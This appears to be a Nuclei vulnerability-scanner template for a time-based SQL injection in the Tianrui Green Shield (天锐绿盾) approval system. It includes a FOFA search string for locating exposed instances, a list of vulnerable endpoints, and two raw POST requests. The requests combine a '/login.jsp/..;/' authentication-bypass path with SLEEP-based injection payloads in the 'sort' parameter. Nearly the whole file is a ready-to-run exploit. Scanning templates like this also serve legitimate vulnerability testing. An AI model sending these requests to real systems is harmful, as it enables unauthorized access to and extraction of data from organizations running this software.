id: tianrui-greenshield-finduserpage-multiple-sqli
info:
  name: 天锐绿盾审批系统 findUserPageExcludeCurrentUser.do 多接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="TIPPAY-绿盾审批系统"
          多个接口通过pageVo参数传递数据存在SQL注入风险，受影响接口包含：
      /invoker/findTenantPage.do
      /dept/findDeptPage.do
      /fileServer/findFileServerPage.do
      /invoker/findCategoryPage.do
      /menu/findModulePage.do
      /role/findRolePage.do
      /thirdSystemConfig/findSingConfigPage.do
      /user/findUserPage.do
      /user/findUserPageExcludeCurrentUser.do?deptId=1
      /invoker/findPropertyPage.do?tenantId=1&categoryId=1
  tags: 天锐绿盾审批系统
http:
- raw:
  - |
    POST /trwfe/login.jsp/..;/user/findUserPageExcludeCurrentUser.do HTTP/1.1
    Host: {{Hostname}}
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded

    sort=1+AND+(SELECT+8234+FROM+(SELECT+SLEEP(5))test)&deptId=1&categoryId=1
  - |
    POST /trwfe/login.jsp/..;/user/findUserPageExcludeCurrentUser.do HTTP/1.1
    Host: {{Hostname}}
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded

    sort=1+AND+(SELECT+8234+FROM+(SELECT+SLEEP(8))test)&deptId=1&categoryId=1
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
